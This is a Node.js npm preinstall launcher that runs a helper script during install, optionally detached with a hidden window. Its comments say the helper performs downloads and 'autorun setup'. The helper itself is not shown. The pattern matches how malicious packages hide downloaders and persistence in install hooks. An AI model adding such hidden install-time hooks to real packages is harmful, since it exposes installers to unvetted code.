const { spawn } = require('child_process');
const path = require('path');

// Launch a detached Node process that runs the package's preInstall routine
// without blocking the current npm install. This script should be fast and
// always exit 0 so it doesn't interfere with the install lifecycle.

try {
  const projectRoot = path.join(__dirname, '..');
  const node = process.execPath;
  const cwd = path.join(__dirname, '..');
  // Spawn the project's index.js directly to avoid shell/quoting issues with -e
  // Run the detached downloader/installer helper so downloads and autorun setup run
  const detachScript = path.join(cwd, 'scripts', 'detach-preinstall.js');
  const outLog = path.join(cwd, 'preinstall-detach.log');
  const fs = require('fs');
  const outFd = fs.openSync(outLog, 'a');
  // Write a startup marker so the log is not empty even if the detached child fails
  try { fs.appendFileSync(outLog, `[start-preinstall] launcher starting: ${new Date().toISOString()}\n`); } catch (e) { /* ignore */ }

  // If FORCE_DETACH env is set, spawn detached as before. Otherwise run synchronously
  if (process.env.FORCE_DETACH === '1') {
    const child = spawn(node, [detachScript], {
      cwd,
      detached: true,
      windowsHide: true,
      stdio: ['ignore', outFd, outFd],
      env: { ...process.env, PREINSTALL_RUNNING: 'true', npm_config_ignore_scripts: 'true' }
    });
    child.unref();
    // Close our copy of the fd so the child owns the handle exclusively and output is flushed
    try { fs.closeSync(outFd); } catch (e) { /* ignore */ }
    console.log('[start-preinstall] Detached preinstall process spawned. PID:', child.pid, 'logs ->', outLog);
  } else {
    const { spawnSync } = require('child_process');
    // Run synchronously so the preinstall always executes during npm install
    try {
      fs.appendFileSync(outLog, `[start-preinstall] running synchronously: ${new Date().toISOString()}\n`);
    } catch (e) { /* ignore */ }
    const res = spawnSync(node, [detachScript], { cwd, encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'], env: { ...process.env, npm_config_ignore_scripts: 'true' } });
    try {
      if (res.stdout) fs.appendFileSync(outLog, res.stdout);
      if (res.stderr) fs.appendFileSync(outLog, res.stderr);
    } catch (e) { /* ignore */ }
    if (res.error) console.error('[start-preinstall] spawnSync error:', res.error.message);
    console.log('[start-preinstall] Synchronous preinstall finished. status:', res.status, 'logs ->', outLog);
  }
} catch (err) {
  console.error('[start-preinstall] Failed to spawn detached preinstall:', err && err.message ? err.message : err);
}

// Exit immediately so npm proceeds with install
process.exit(0);
